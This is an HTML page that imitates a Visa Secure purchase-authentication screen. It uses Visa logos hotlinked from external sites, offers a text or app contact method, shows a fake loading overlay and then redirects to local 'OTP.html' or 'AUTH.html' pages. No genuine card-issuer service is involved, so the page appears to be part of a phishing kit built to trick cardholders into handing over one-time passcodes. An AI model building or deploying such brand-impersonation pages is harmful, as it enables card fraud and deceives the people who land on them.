<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Visa Authentication</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Roboto', sans-serif;
      background-color: #ffffff;
      margin: 0;
      padding: 0;
    }

    .container {
      max-width: 400px;
      margin: 40px auto;
      padding: 20px;
    }

    .header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      font-size: 16px;
      font-weight: bold;
      margin-bottom: 10px;
    }

    .visa-logo img {
      height: 24px;
    }

    h2 {
      margin-top: 10px;
      font-size: 22px;
      font-weight: 500;
    }

    p {
      font-size: 14px;
      color: #333;
      margin-bottom: 20px;
      line-height: 1.5;
    }

    .options {
      margin: 20px 0;
    }

    .option {
      display: flex;
      align-items: center;
      background-color: #f5f5f5;
      padding: 14px 12px;
      border-radius: 8px;
      border: 2px solid #ccc;
      margin-bottom: 15px;
      transition: border 0.3s;
    }

    .option:hover {
      border-color: #0050A0;
    }

    .option input[type="radio"] {
      width: 22px;
      height: 22px;
      margin-right: 14px;
      accent-color: #0050A0;
    }

    .option label {
      font-size: 16px;
      color: #000;
    }

    .continue-btn {
      background-color: #0050A0;
      color: white;
      padding: 14px;
      width: 100%;
      border: none;
      font-size: 16px;
      font-weight: bold;
      border-radius: 6px;
      cursor: pointer;
      margin-top: 10px;
    }

    .continue-btn:hover {
      background-color: #003b7a;
    }

    hr {
      border: none;
      border-top: 1px solid #ccc;
      margin: 10px 0 20px;
    }

    /* Loader styles */
    #loading {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: white;
      z-index: 9999;
      justify-content: center;
      align-items: center;
      flex-direction: column;
    }

    #loading img {
      width: 60px;
      height: 60px;
    }

    #loading p {
      margin-top: 10px;
      font-size: 16px;
      font-weight: bold;
      color: #000;
    }
   /* Visa Secure logo in loading overlay */
    #loading img:last-child {
      height: 80px;
      width: auto;
      margin-top: 15px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <span>Authentication</span>
      <span class="visa-logo">
        <img src="https://upload.wikimedia.org/wikipedia/commons/d/d6/Visa_2021.svg" alt="Visa Logo">
      </span>
    </div>
    <hr />
    <h2><strong>Confirm your identity</strong></h2>
    <p>To help us keep your account secure, confirm your identity to complete this purchase. Choose a contact method.</p>

    <div class="options">
      <div class="option">
        <input type="radio" id="text" name="method" checked />
        <label for="text">Text &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xxxxxxxxxx</label>
      </div>
      <div class="option">
        <input type="radio" id="app" name="method" />
        <label for="app">Mobile App &nbsp;&nbsp;&nbsp;&nbsp; xxxx App</label>
      </div>
    </div>

    <button class="continue-btn" onclick="showProcessing()">CONTINUE</button>
  </div>

  <!-- Loading Overlay -->
  <div id="loading">
    <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading">
    <img src="https://www.visa.ie/content/dam/VCOM/regional/ve/unitedkingdom/in-page-images/SCA/visa-secure_blu_300dpi.jpg" alt="Visa Secure Logo">
  </div>

  <script>
    function showProcessing() {
      const selectedMethod = document.querySelector('input[name="method"]:checked').id;
      document.getElementById('loading').style.display = 'flex';

      setTimeout(function () {
        if (selectedMethod === 'text') {
          window.location.href = "OTP.html"; // SMS-based OTP
        } else if (selectedMethod === 'app') {
          window.location.href = "AUTH.html"; // App-based authentication
        }
      }, 2000);
    }
  </script>
</body>
</html>
